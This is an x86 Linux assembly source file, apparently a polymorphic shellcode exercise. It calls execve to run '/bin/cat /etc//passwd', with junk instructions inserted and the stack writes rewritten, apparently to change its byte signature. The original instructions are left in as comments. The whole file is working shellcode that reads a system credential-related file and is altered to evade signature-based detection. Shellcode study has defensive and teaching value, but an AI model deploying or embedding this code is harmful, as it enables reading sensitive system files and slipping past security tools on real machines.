; Improve v0->v1

global _start

section .text
_start:
	xor eax,eax		;zero EAX
	cdq			;EDX becomes zero too 
	push edx		;0 on the stack
	push dword 0x7461632f	;tac/ in little endian, this is /cat
STD	;junk code	
	push dword 0x6e69622f	;nib/
	mov ebx,esp		;create a pointer to /bin/cat

MOV DWORD [ESP-4], EDX
MOV DWORD [ESP-8], 0x64777373
MOV DWORD [ESP-12], 0x61702f2f
MOV DWORD [ESP-16], 0x6374652f 
SUB ESP, 16
;-----------
;	push edx		;store the pointer on the stack
;	push dword 0x64777373	;dwss
;	push dword 0x61702f2f	;ap//
;	push dword 0x6374652f	;cte/
;-----------

	mov ecx,esp		;create a pointer to /etc//passwd
NOP	;junk code
	mov al, 0xb		;AL holds number 11d 
	push edx		;0
	push ecx		;/etc//passwd
CLD	;junk code
	push ebx		;/bin/cat
	mov ecx,esp		;move top of the stack to ecx

	int 80h			;invoke syscall (#define __NR_execve 11)
;execve("/bin/cat", ["/bin/cat", "/etc//passwd"], 0  )
;EAX   ( EBX      ,          ECX               , EDX)
